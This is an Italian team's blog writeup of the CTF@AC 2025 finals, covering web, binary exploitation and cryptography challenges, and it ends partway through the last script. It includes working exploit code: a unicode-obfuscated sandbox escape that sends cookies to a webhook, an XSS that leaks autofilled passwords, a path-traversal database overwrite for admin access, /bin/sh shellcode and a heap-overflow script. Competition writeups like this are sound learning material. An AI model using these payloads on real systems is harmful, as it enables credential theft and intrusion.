---
title: "Finali CTF@AC 2025"
date: 2025-11-09T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["ctfatac", "ctf", "binary", "crypto", "web", "ctfatac2025"]
author: "Paolo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Tutti i writeup della finale di CTF@AC, edizione 2025."
canonicalURL: "https://pascalctf.github.io/en/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io" # image path/url
    alt: "Finali CTF@AC 2025" # alt text
    caption: "Tutti i writeup della finale di CTF@AC, edizione 2025." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/PascalCTF/PascalCTF.github.io/blob/main/content/en"
    Text: "Suggerisci modifiche" # edit text
    appendFilePath: true # to append file path to Edit link
-------------------------------------------------------

# Finali CTF@AC 2025

![logo ctf at ac](/images/ctf@ac.png)

Abbiamo (Paolo) partecipato a questo CTF a Timișoara da **ven 07 nov. 2025, 16:00 CET** a **dom 09 nov. 2025, 10:00 CET**, arrivando secondi assoluti 🥳.

Anche se era la nostra prima esperienza CTF in un contesto internazionale, ci siamo davvero divertiti a risolvere queste challenge.

I componenti del team che hanno partecipato:

* **Marco Balducci**    ([`@Cryingfreeman74`](https://github.com/Mark-74))
* **Alan Davide Bovo**  ([`@Hecker404`](https://github.com/AlBovo))
* **Enea Maroncelli**   ([`@Zazaman`](https://github.com/eneamaroncelli27))

## Web 🌐

### Silicon Dioxide

#### Analisi

Questa challenge forniva il codice sorgente di un’applicazione web Node.js progettata per scrivere e condividere codice JavaScript “sandboxato” per modificare un canvas. C’erano sia un frontend sia un backend che gestivano l’esecuzione del JavaScript.

##### Frontend

Il frontend implementava un ambiente “sandboxato” fatto in casa per eseguire il codice JavaScript come segue:

```js
/**
 * Super Duper Sandbox
 */
function canvasSandbox(code) {
    try {
        const sandboxFunc = new Function(
            "canvas",
            `
            const window = undefined;
            const document = undefined;
            const alert = undefined;
            const console = undefined;
            const eval = undefined;
            const Function = undefined;
            const setTimeout = undefined;
            const setInterval = undefined;
            const fetch = undefined;
            const XMLHttpRequest = undefined;
            const WebSocket = undefined;
            const localStorage = undefined;
            const sessionStorage = undefined;
            const location = undefined;
            const history = undefined;
            const navigator = undefined;
            const parent = undefined;
            const top = undefined;
            const self = undefined;
            const globalThis = undefined;
            canvas.constructor = null;
            canvas.__proto__.constructor = null;
            canvas.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
            
            ${code}
        `
        );

        sandboxFunc.call(null, canvas);
    } catch (err) {
        alert("Sorry, your code did not run.");
    }
}
```

Forniva anche una funzione che eseguiva automaticamente qualsiasi codice JavaScript passato tramite il parametro di query `/?code=` all’interno di questo ambiente sandboxato.

##### Backend

Il backend era responsabile della condivisione del codice e includeva un ulteriore livello di controlli:

```js
const allowed_keywords = [
    "const",
    "ctx",
    "canvas",
    "getContext",
    "console",
    "let",
    "vx",
    "vy",
    "radius",
    "function",
    "update",
    "clearRect",
    "width",
    "height",
    "if",
    "beginPath",
    "arc",
    "Math",
    "PI",
    "fillStyle",
    "orange",
    "fill",
    "requestAnimationFrame"
];

function checkCode(code) {
    const matches = code.match(/[A-Za-z]{2,}/g) || [];

    const disallowed = matches.filter((k) => !allowed_keywords.includes(k));

    return disallowed.length === 0;
}
```

L’endpoint `/share` funzionava così:

* Controllava la presenza di parole chiave non consentite nel codice.
* Faceva eseguire il codice da un bot Chromium usando l’endpoint `/?code=`.

Tuttavia, la vulnerabilità principale era nel cookie della flag — era salvato con `httpOnly: false`, il che significa che un semplice XSS poteva rubarlo facilmente.

```js
context.addCookies([
    {
        name: "flag",
        domain: "localhost",
        path: "/",
        value: FLAG,
        sameSite: "Lax",
        secure: false,
        httpOnly: false
    }
]);
```

#### Soluzione

Dopo aver analizzato l’intera challenge, trovare una soluzione funzionante è stato semplice. Il controllo delle parole chiave del backend poteva essere bypassato usando la codifica UTF-8 (aggirando la regex `[A-Za-z]{2,}`). Poi, il frontend poteva essere sfruttato usando la parola chiave `this`.

Il frontend rimuoveva solo i riferimenti *diretti* alla maggior parte delle funzioni JavaScript, ma non sanitizzava correttamente gli accessi tramite il vero contesto `window` o `document`.

Una volta capito questo, abbiamo scritto un exploit completamente funzionante che esfiltrava il cookie dell’admin usando una richiesta `fetch` verso il nostro webhook.

#### Exploit

```js
const ctx = canvas.getContext('2d');
const p = ctx['\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f'];
const c = p['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072'];
const f = c['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072'];
const g = f('\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0074\u0068\u0069\u0073')();
const d = g['\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074'];
const s = d['\u0063\u006f\u006f\u006b\u0069\u0065'];
const e = g['\u0065\u006e\u0063\u006f\u0064\u0065\u0055\u0052\u0049\u0043\u006f\u006d\u0070\u006f\u006e\u0065\u006e\u0074'];
const h = g['\u0066\u0065\u0074\u0063\u0068'];
const u = e(s);
h('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u002e\u0073\u0069\u0074\u0065\u002f\u0035\u0063\u0035\u0038\u0037\u0066\u0037\u0061\u002d\u0031\u0063\u0030\u0030\u002d\u0034\u0035\u0038\u0032\u002d\u0061\u0035\u0062\u0033\u002d\u0031\u0061\u0030\u0038\u0064\u0065\u0032\u0031\u0032\u0033\u0061\u0062\u003f\u0064\u003d' + u);
```

Una volta eseguito, la flag appariva nei log del webhook come:

`d=flag=CTF{c0d2d75449e3167001cbb38b891a78c8168c165d2cbd48f8f7b3123759963f66}`

### Retro Forum

#### Analisi

Retro Forum era una piattaforma di post/chat dove gli utenti potevano condividere pensieri e gli amministratori moderarli.

Il sorgente mostrava come era strutturato e dove era salvato il database SQLite, oltre alla vulnerabilità principale in questa route:

```python
@app.route('/edit_profile', methods=['GET', 'POST'])
def edit_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    c = conn.cursor()
    if request.method == 'POST':
        new_bio = request.form['bio']
        filename = None
        if 'profile_pic' in request.files:
            file = request.files['profile_pic']
            if file:
                filename = file.filename
                print(filename)
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
                c.execute("UPDATE users SET profile_pic=? WHERE id=?", (filename, session['user_id']))
        c.execute("UPDATE users SET bio=? WHERE id=?", (new_bio, session['user_id']))
        conn.commit()
        conn.close()
        return redirect(url_for('profile', id=session['user_id']))
    c.execute("SELECT bio, profile_pic FROM users WHERE id=?", (session['user_id'],))
    bio, pic = c.fetchone()
    conn.close()
    return render_template('edit_profile.html', bio=bio, pic=pic)
```

Qui l’immagine caricata dall’utente veniva salvata **senza alcuna sanitizzazione o validazione**, lasciando la piattaforma vulnerabile a un attacco di **path traversal**, che permetteva all’utente di sovrascrivere qualsiasi file con l’immagine caricata.

Prima della soluzione, è importante notare l’esistenza dell’endpoint `debug_file`:

```python
@app.route('/debug/<filename>')
def debug_file(filename):
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    try:
        file_path = os.path.join(os.getcwd(), filename)
        with open(file_path, 'r') as f:
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain'}
    except Exception as e:
        return f"Error: {str(e)}", 404
```

Questo endpoint forniva in seguito **lettura arbitraria** dell’intero filesystem, permettendoci di recuperare la flag.

#### Soluzione

Una volta confermata la vulnerabilità di **path traversal**, il passo successivo è stato **sovrascrivere il file `retro.db`** caricando un file malevolo chiamato `../../retro.db` tramite il form di upload dell’immagine profilo.

Dopo aver sovrascritto con successo il database, ho ottenuto **privilegi admin**, che mi hanno consentito di usare un’altra vulnerabilità di path traversal nell’endpoint *debug file* per leggere file arbitrari.

Da lì ho scaricato `flag.txt`

```
gAAAAABpDfJWpJyLk4xz6hJCspj6XEpp0dCKgZUegC18TYQHfABujfRSTCa0zEei6qnDP6k8I-2V0by1aeJSEhKhhWI5EWppnQ==
```

e `populate.py`, che conteneva la logica di inizializzazione del database.

Dentro `populate.py` ho trovato dati di default degli utenti e post, incluso un utente **Josh**, che menzionava spesso la sua password nei post e nelle chat.

Analizzandoli, ho dedotto che la password di Josh veniva usata come chiave per cifrare la flag con **Fernet**. Usando questo indizio, ho forzato tutte le combinazioni possibili dei frammenti della sua password finché la flag non si è decrittata correttamente.

#### Script

Sono stati usati diversi script per risolvere la challenge, ma i due più importanti sono l’**exploit per ottenere i privilegi admin** e lo **script di brute-force della password**.

##### Exploit per privilegi admin

```python
#!/usr/bin/env python3
import requests
import sys, os
import sqlite3, tempfile
from werkzeug.security import generate_password_hash

URL = sys.argv[1]
assert requests.get(f"{URL}/").status_code == 200

def init_db(filename="retro.db"):
    conn = sqlite3.connect(filename)
    c = conn.cursor()
    c.execute('''CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        bio TEXT,
        is_admin INTEGER DEFAULT 0,
        profile_pic TEXT DEFAULT 'default.png'
    )''')
    c.execute('''CREATE TABLE posts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        title TEXT,
        content TEXT,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    c.execute('''CREATE TABLE comments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        post_id INTEGER,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (post_id) REFERENCES posts(id),
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    c.execute('''CREATE TABLE chats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user1_id INTEGER,
        user2_id INTEGER,
        FOREIGN KEY (user1_id) REFERENCES users(id),
        FOREIGN KEY (user2_id) REFERENCES users(id)
    )''')
    c.execute('''CREATE TABLE messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        sender_id INTEGER,
        content TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (chat_id) REFERENCES chats(id),
        FOREIGN KEY (sender_id) REFERENCES users(id)
    )''')
    c.execute("INSERT INTO users (username, password, bio, is_admin) VALUES (?, ?, ?, 1)",
              ("admin", generate_password_hash("admin123"), "Retro overlord"))
    conn.commit()
    conn.close()

s = requests.Session()
s.post(f"{URL}/register", data={
    "username": (username := os.urandom(20).hex()),
    "password": (password := os.urandom(20).hex()),
    "bio": "hello",
})
s.post(f"{URL}/login", data={
    "username": username,
    "password": password,
})

with tempfile.NamedTemporaryFile("w+b") as tf:
    print(tf.name)
    init_db(tf.name)

    s.post(f"{URL}/edit_profile", data={
        "bio": "palle",   
    }, files={
        "profile_pic": ("../../retro.db", tf, "image/jpeg"),
    })

print("[*] Uploaded malicious profile picture")
s.get(f"{URL}/logout")
r = s.post(f"{URL}/login", data={
    "username": "admin",
    "password": "admin123",
})

print(s.cookies.get_dict())
```

##### Script di brute-force della password

> N.B.: Le liste `d` e `n` contenevano parole e date trovate nelle chat di Josh, che suggerivano la struttura della password.

```python
import base64, itertools
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

d = ['20.05.2023', '14.03.2001']
n = ['pixel', 'wigglepuff']
i = n + d
l = list(itertools.permutations(i))

for perm in l:
    password = ".".join(perm).encode()
    salt = b"whatever"

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=390000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)

    with open("flag.txt", "rb") as fh:
        token = fh.read()

    try:
        plaintext = f.decrypt(token)
        print(f"Password trovata: {password.decode()}")
        print(plaintext.decode())
        break
    except:
        continue
```

Questa combinazione di exploit e analisi ha portato alla decrittazione della flag e al completamento della challenge.

### Not wordle

#### Analisi

Questa challenge era una piattaforma tipo Wordle in Node.js dove si potevano indovinare parole casuali (tutte esattamente di 5 caratteri).

Tuttavia, la challenge forniva un interruttore per parole "random"/"daily". Quest’ultimo usava un codice speciale `wotd`. Dopo aver analizzato per un po’ il backend ho trovato questo snippet che implementava la logica di generazione della parola.

```js
function getSecret(mode, cookies) {
    const m = (mode || cookies.mode || 'random').toLowerCase();
    if (m === 'wotd') {
        const flag = (process.env.FLAG || 'REAL_FLAG_ON_REMOTE').toLowerCase();
        return { mode: 'wotd', secret: flag };
    }
    let secret = cookies.randomSecret;
    if (!secret || !/^[a-z]{5}$/.test(secret)) {
        secret = pickRandomWord();
    }
    return { mode: 'random', secret };
}
```

È chiaro che la flag fosse la parola del giorno sulla piattaforma e che, in pratica, bastava trovarla.

#### Soluzione

Poiché la challenge non memorizzava alcun contatore per il numero di tentativi, trovare la flag con un brute force era banale.

Inoltre, la challenge non controllava nemmeno la lunghezza del tentativo, quindi si poteva anche forzare la parola **carattere per carattere** usando l’alfabeto `0123456789abcdefCTF{}`.

#### Script

```python
#!/usr/bin/env python3
import string, requests

URL = "http://a733fa9b.ctf.ac.upt.ro"
LENGTH = 69
CHARSET = 'CTF{}' + string.hexdigits.lower()

s = requests.Session()
s.post(URL + "/api/start?mode=wotd")

flag = ''
for i in range(LENGTH):
    for c in CHARSET:
        r = s.post(URL + "/api/check", json={"guess": flag + c}).json()
        if r['feedback'][i]["status"] == "correct":
            flag += c
            print(flag)
            break

print("FLAG:", flag)
```

### lolchat2

#### Analisi

Questa challenge era un sequel dell’originale `lolchat`, che non avevamo risolto durante le qualificazioni.
Forniva una chat basata su stanze sviluppata con WebSocket in un ambiente **black-box**, senza accesso al codice backend, quindi sono state necessarie diverse assunzioni.

Come nell’originale, le prime tre stanze non rispondevano ai nostri messaggi. Tuttavia, nelle stanze `party` e `game` c’erano utenti che scambiavano messaggi casuali.

La più interessante era `game`, dove l’utente `tom` inviava ripetutamente gli stessi messaggi, chiedendo aiuto per trovare la sua **password** (la flag). I messaggi più significativi includevano:

* "i think i had a password saved in my browser"
* "it would usually fill it out for me"

![screenshot della stanza di gioco della challenge](/images/lolchat2.png)

#### Soluzione

Dopo alcune rapide osservazioni, è risultato chiaro che la piattaforma era fortemente vulnerabile a **XSS (Cross-Site Scripting)**; l’unica validazione reale era **lato client**, applicata solo quando *si inviavano* messaggi, non quando *si ricevevano*.

Inizialmente abbiamo provato a reindirizzare il bot al nostro webhook, ma non ha funzionato: probabilmente era limitato alla sua rete localhost. Abbiamo quindi ipotizzato che l’approccio migliore fosse far **inviare** al bot un messaggio nella chat contenente dati sensibili usando il nostro script iniettato, e questa volta ha **funzionato**.

Infine, abbiamo capito che potevamo far **autocompilare** al browser del bot un campo password (usando le credenziali salvate) e **inviare** il valore direttamente in chat, visibile a tutti.

#### Script

Di seguito l’HTML che abbiamo usato per risolvere la challenge. Si basa sull’assunzione che il browser del bot compili automaticamente l’input password, attivando l’evento `oninput`, che poi invia il messaggio nella stanza `game`.

```html
<form>
  <input type="password" name="password" autocomplete oninput="window.socket.emit('sendMessage', { room: 'game', message: document.getElementsByName('password')[0].value });">
</form>
```

## Exploitation binaria 🏴‍☠️

### baby-ikea

#### Analisi

La challenge permetteva di connettersi via netcat al server e inviare dei dati.
Dagli errori restituiti dal servizio, era chiaro che si potessero inviare solo dati codificati in base64.

Ho provato alcune istruzioni assembly a caso e ho scoperto che l’architettura era a 32 bit e che eseguiva codice asm arbitrario.

#### Soluzione

La soluzione prevedeva la scrittura di uno script asm completo nella struttura corretta e fargli fare ciò che volevamo. Ho deciso di far avviare una shell, poi ho codificato lo script in base64 e l’ho inviato al server.

#### Script

```py
from pwn import *
import base64
p = remote('?', ?)

## Chiama execve('/bin/sh') e spawna una shell
shellcode = """
section .data
    path    db '/bin/sh', 0         
    envp    dd 0                    
section .text
    global _start

_start:
    mov eax, 11          ; syscall number for execve
    mov ebx, path        ; filename pointer
    mov edx, envp        ; envp pointer

    int 0x80             ; call kernel

    mov eax, 1
    xor ebx, ebx
    int 0x80
"""

p.sendlineafter('> ', base64.b64encode(shellcode.encode()).decode())
p.interactive()
```

### Tetrastack

#### Analisi

Tetrastack è un servizio che ci permette di giocare a Tetris.

Analizzando le varie voci di menu, si nota un’opzione per salvare il proprio nome, ma solo a partita finita.
La funzione decompilata `set_name` è la seguente:

```c
void __cdecl set_name(Player *p)
{
  size_t v1; // rax
  signed __int64 got; // [rsp+20h] [rbp-10h]
  signed __int64 n; // [rsp+28h] [rbp-8h]

  if ( board->game_over )
  {
    puts("\nEnter display name length:");
    n = read_long();
    if ( n > 0 )
    {
      puts("Enter display name bytes:");
      got = read_n((unsigned __int8 *)p->name, n);
    ...
```

Come si vede, c’è una vulnerabilità nel modo in cui viene letta la lunghezza del nome. Esiste un controllo sul limite inferiore (n > 0) ma non su quello superiore (n < 64), quindi possiamo inviare ad esempio 255 per effettuare un buffer overflow.

Per ottenere qualcosa dall’overflow, dobbiamo capire dove si trova `player->name` in memoria e cosa c’è subito dopo.

La risposta sta nella `main`:

```c
  player = (Player *)calloc(1u, 0x10u);
  player->name_cap = 64;
  v4 = player;
  v4->name = (char *)malloc(player->name_cap);
  callbacks = (Callbacks *)malloc(0x10u);
  callbacks->on_gameover = real_gameover;
  callbacks->on_lineclear = 0;
```

Come si vede, il nome sta sull’heap, e subito dopo c’è una struct `Callbacks` che contiene due puntatori a funzione: `on_gameover` e `on_lineclear`.

#### Soluzione

Con l’aiuto di GDB ho trovato gli offset precisi sull’heap e ho potuto sovrascrivere il puntatore a funzione `on_gameover` con l’indirizzo di `win`.

#### Script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./tetrastack_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("8a0e1141.ctf.ac.upt.ro", 9449)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b main
                                b set_name
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def wait_menu_or_prompt(io, prompt=b"8) Quit"):
    data = b""
    while True:
        chunk = io.recvuntil(b"\n", timeout=0.5)
        if not chunk:
            continue
        data += chunk
        if b"Enter display name length" in data:
            return data, True
        if prompt in data:
            return data, False

def reach_game_over(io, max_steps=2000):
    data, got_prompt = wait_menu_or_prompt(io)
    if got_prompt:
        return
    for _ in range(max_steps):
        io.sendline(b"1")
        data, got_prompt = wait_menu_or_prompt(io)
        if got_prompt:
            log.info("Reached name prompt")
            return
    raise RuntimeError("Failed to trigger game over")

def main():
    r = conn()

    reach_game_over(r)
    r.sendline(b'88')
    r.sendlineafter(b'bytes:', b'a' * 80 + p64(elf.sym.win))
    r.sendline(b'8')

    x = r.recvall(timeout=1).decode()
    r.close()
    
    print(x)
    # r.interactive()

if __name__ == "__main__":
    main()
```

### mini-e8

#### Analisi

`mini-e8` è un piccolo binario tipo REPL “engine”. Il costruttore dell’Engine legge `flag.txt`, calcola un checksum XOR scorrevole da 64 byte, lo fa XOR con `0x7E3A829F` e memorizza un `flag_header` di 16 byte seguito dai byte della flag in un’arena puntata da `(QWORD*)Engine + 5`. Un buffer di byte in stile JS condivide questa arena **davanti** al flag_header.

##### Layout dell’header (dword little-endian)

```
flag_header[0] = 0x00000001          # deve essere forzato a 0 per getflag
flag_header[1] = checksum(flag)^0x7E3A829F
flag_header[2] = 0x8BADF00D          # costante magica controllata da getflag
flag_header[3] = 0x00000000          # diventa il nostro “unlock”; serve 42 prima della seconda opt
```

I byte della flag iniziano a flag_header + 0x10.

##### Funzioni critiche

* Engine::Engine: scrive flag_header + flag nell’arena;
* compute_checksum(flag): XOR scorrevole dei primi 64 byte poi XOR con `0x7E3A829F`.
* cmd_optimize_function (`opt`): Prima chiamata abilita la “fast mode” (scrive capacità di check). Seconda chiamata: se `flag_header[3] == 42`, imposta un byte di enable a `Engine+0x80` a 1.
* cmd_getflag (`getflag`) richiede:

  1. flag_header[2] == 0x8BADF00D
  2. checksum ricalcolato ^ 0x7E3A829F == flag_header[1]
  3. flag_header[0] == 0
  4. byte di enable a `Engine+0x80` == 1

##### Vulnerabilità

In fast mode, `write <idx> <val>` valida `idx < capacity` invece di `idx < length`. La capacità > lunghezza, quindi indici oltre il corpo logico del buffer (>= length corrente) possono raggiungere il flag_header adiacente. Questo dà scritture a singolo byte controllate sui campi dell’header.

```c
if ( *((_BYTE *)this + 0x20) && a2 < *((_QWORD *)this + 5) || a2 < *((_QWORD *)this + 2) )
  {
    result = *(_QWORD *)this;
    *(_BYTE *)(*((_QWORD *)this + 1) + **(_QWORD **)this + a2) = a3;
  }
```

##### Offset mappati ai byte dell’header

Dopo la prima `opt`, dato che il flag_header è posizionato dopo il buffer in memoria, i seguenti indici (nella REPL) indirizzano il flag_header:

```
64..67  -> flag_header[0]
68..71  -> flag_header[1]
72..75  -> flag_header[2]
76..79  -> flag_header[3]
```

Ci basta cambiare flag_header[0] (impostare tutti e quattro i byte a 0) e flag_header[3] (impostare il byte meno significativo a 42 e azzerare il resto) prima di invocare la seconda `opt`.

#### Soluzione

* Eseguire `opt` una volta per entrare nella modalità veloce (controllo su capacity).
* Azzerare `flag_header[0]` scrivendo 0 agli offset 64–67.
* Impostare il valore di sblocco: scrivere i byte 76–79 come `42, 0, 0, 0` così che `flag_header[3] == 42`.
* Chiamare `opt` di nuovo; la seconda ottimizzazione vede header[3] == 42 e attiva il byte di enable.
* Chiamare `getflag`; tutte le condizioni sono soddisfatte e stampa la flag da header+0x10.

```
opt
write 64 0
write 65 0
write 66 0
write 67 0
write 76 42
write 77 0
write 78 0
write 79 0
opt
getflag
```

#### Script

```python
steps = [
    b"opt",                # entra nel fast path
    b"write 64 0",         # flag_header[0] byte 0
    b"write 65 0",         # flag_header[0] byte 1
    b"write 66 0",         # flag_header[0] byte 2
    b"write 67 0",         # flag_header[0] byte 3
    b"write 76 42",        # flag_header[3] byte 0 -> 42
    b"write 77 0",         # azzera i restanti
    b"write 78 0",
    b"write 79 0",
    b"opt",                # seconda optimize attiva se header[3]==42
    b"getflag",            # stampa la flag se i check passano
]
```

## Crittografia 🔑

### Sparse Hills

#### Analisi

Abbiamo modellato il servizio come un semplice cifrario lineare su Z_257, dove il server calcola $c = K m \bmod 257$. La stessa matrice chiave 257×257 è riutilizzata, gli input sono zero-padding fino a un blocco intero, e gli output sono stampati come numeri esadecimali a tre cifre. Poiché l’oracolo consente di cifrare qualsiasi cosa e la mappatura è lineare, possiamo rivelare le colonne di $K$ cifrando i vettori base. Questo significa che possiamo recuperare la chiave e, da lì, la flag.

#### Soluzione

Per prima cosa prendo la flag cifrata così abbiamo il suo ciphertext. Poi cifriamo ciascun vettore canonico, una posizione a 1 e il resto a 0. Ogni query restituisce una colonna di $K$. Impilandole, ricostruiamo l’intera matrice. Inverto questa matrice modulo 257 con Gauss-Jordan (gli inversi di Fermat rendono facile la divisione), moltiplico l’inversa per il ciphertext della flag per ottenere il vettore di plaintext, converto 256 in 0 quando trasformo in byte, rimuovo lo zero-padding e decodifico in UTF-8. Servono esattamente 257 cifrature per il recupero, e l’inversione è veloce a questa dimensione.

#### Script

```python
import socket
import sys
import re
from typing import List

P = 257  # Prime modulus
N = 257  # Block length == dimension

def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    """Read from socket until `marker` appears."""
    buf = bytearray()
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return bytes(buf)

def recv_all(sock: socket.socket) -> bytes:
    """Read until the socket is closed and return all bytes."""
    buf = bytearray()
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        buf += chunk
    return bytes(buf)

HEX3_RE = re.compile(r"^(?:[0-9a-f]{3}\s+){256}[0-9a-f]{3}$", re.IGNORECASE)

def parse_hex_vector(blob: bytes) -> List[int]:
    """Extract the final 257-entry hex vector from a server response."""
    text = blob.decode(errors="ignore")
    for line in reversed(text.strip().splitlines()):
        line = line.strip()
        if HEX3_RE.fullmatch(line):
            return [int(tok, 16) for tok in line.split()]
    raise ValueError("Could not find a valid ciphertext line in server output.")


# Oracle wrappers

def get_encrypted_flag(host: str, port: int) -> List[int]:
    """Request option 1 from the server and parse the returned ciphertext."""
    s = socket.socket()
    s.connect((host, port))
    recv_until(s, b"> ")
    s.sendall(b"1\n")
    data = recv_all(s)
    s.close()
    return parse_hex_vector(data)

def encrypt(host: str, port: int, block: bytes) -> List[int]:
    """Request option 2 and send a 257-byte block, returning the ciphertext."""
    assert len(block) == N, "block must be exactly N=257 bytes"
    s = socket.socket()
    s.connect((host, port))
    recv_until(s, b"> ")
    s.sendall(b"2\n")
    recv_until(s, b"> ")
    s.sendall(block)
    data = recv_all(s)
    s.close()
    return parse_hex_vector(data)


# Modular algebra

def mat_inv_mod_p(A: List[List[int]], p: int) -> List[List[int]]:
    """Compute the inverse of A modulo prime p using Gauss-Jordan."""
    n = len(A)
    M = [[A[i][j] % p for j in range(n)] for i in range(n)]
    I = [[1 if i == j else 0 for j in range(n)] for i in range(n)]
    
    for col in range(n):
        # Find a pivot row with nonzero in column 'col'
        pivot = col
        while pivot < n and M[pivot][col] == 0:
            pivot += 1
        if pivot == n:
            raise ValueError("Matrix not invertible (no pivot).")

        # Swap to current row if needed
        if pivot != col:
            M[col], M[pivot] = M[pivot], M[col]
            I[col], I[pivot] = I[pivot], I[col]

        # Normalize pivot row
        inv_piv = pow(M[col][col], p - 2, p)  # Fermat inverse (p is prime)
        for j in range(n):
            M[col][j] = (M[col][j] * inv_piv) % p
            I[col][j] = (I[col][j] * inv_piv) % p

        # Eliminate this column from all other rows
        for r in range(n):
            if r == col:
                continue
            factor = M[r][col]
            if factor:
                for j in range(n):
                    M[r][j] = (M[r][j] - factor * M[col][j]) % p
                    I[r][j] = (I[r][j] - factor * I[col][j]) % p
    return I

def mat_vec_mod_p(M: List[List[int]], v: List[int], p: int) -> List[int]:
    n = len(M)
    out = [0] * n
    for i in range(n):
        s = 0
        row = M[i]
        for j in range(n):
            s += row[j] * v[j]
        out[i] = s % p
    return out


def recover_matrix_K(host: str, port: int) -> List[List[int]]:
    K_cols = []
    for i in range(N):
        block = bytearray(N)
        block[i] = 1  # e_i (mod 257)
        y = encrypt(host, port, bytes(block))
        if len(y) != N:
            raise RuntimeError("oracle returned wrong vector length")
        K_cols.append(y)
        # Optional progress indicator
        if (i + 1) % 16 == 0 or i == N - 1:
            print(f"[+] collected {i + 1}/{N} columns of K")
    # Convert "list of columns" -> 2D matrix (row-major)
    K = [[K_cols[j][i] for j in range(N)] for i in range(N)]
    return K

def strip_zero_padding(mbytes: bytes) -> bytes:
    if 0 in mbytes:
        return mbytes[:mbytes.index(0)]
    return mbytes

def main():
    host = sys.argv[1] if len(sys.argv) >= 2 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 12346

    print(f"[*] Target: {host}:{port}")
    print("[*] Fetching encrypted flag...")
    c_flag = get_encrypted_flag(host, port)
    print("[+] Got encrypted flag (257 integers).")

    print("[*] Recovering encryption matrix K via 257 chosen-plaintext queries...")
    K = recover_matrix_K(host, port)
    print("[+] Recovered K.")

    print("[*] Inverting K modulo 257...")
    K_inv = mat_inv_mod_p(K, P)
    print("[+] Inverted K.")

    print("[*] Decrypting flag...")
    m_vec = mat_vec_mod_p(K_inv, c_flag, P)

    # Sanity: we expect every coordinate to be in 0..255 (not 256)
    if any(x == 256 for x in m_vec):
        print("[!] Warning: found value 256 in plaintext vector; replacing with 0 for bytes().")
    m_bytes = bytes((0 if x == 256 else x) for x in m_vec)
    m_bytes = strip_zero_padding(m_bytes)

    try:
        decoded = m_bytes.decode("utf-8", errors="replace")
    except Exception:
        decoded = repr(m_bytes)

    print(decoded)

if __name__ == "__main__":
    main()
```

### Black prince

#### Analisi

* La ricognizione ha mostrato una web app molto semplice con due endpoint:

  * `/encode`: accetta un input limitato a lettere maiuscole A–Z, cifre 0–9, parentesi graffe `{}` e underscore `_`, e restituisce una sequenza di token di quattro lettere.
  * `/flag`: restituisce una lunga "frase" composta interamente da parole di quattro lettere (token) invece di una flag leggibile.

`/encode` è un encoder randomizzato che mappa ciascun carattere di input a una delle diverse possibili parole di quattro lettere. La pagina `/flag` è la flag codificata usando quei token.

Una singola passata sull’alfabeto rivela solo un sottoinsieme di token. Per decodificare `/flag`, dobbiamo raccogliere tutte le varianti di token presenti in `/flag` interrogando ripetutamente `/encode` con caratteri ripetuti e registrando i riscontri che corrispondono ai token visti in `/flag`.

L’alfabeto consentito è di 39 simboli (26 lettere + 10 cifre + `{`, `}`, `_`).

#### Soluzione

La strategia è: recuperare la sequenza ordinata di token da `/flag`, poi inviare ripetutamente `ch * N` per ogni carattere consentito a `/encode`, registrando qualsiasi token restituito che appaia anche su `/flag`. Quando ogni token di `/flag` ha un carattere mappato, ricostruiamo la flag per sostituzione in ordine. In pratica, ripetere un carattere fa emergere più varianti di token.

#### Script

```python
import time
import random
import string
from typing import Dict, List

import requests
import bs4

BASE_URL = 'http://168908dd.ctf.ac.upt.ro'
ROUNDS = 60
REPEATS = 10
SLEEP = 0
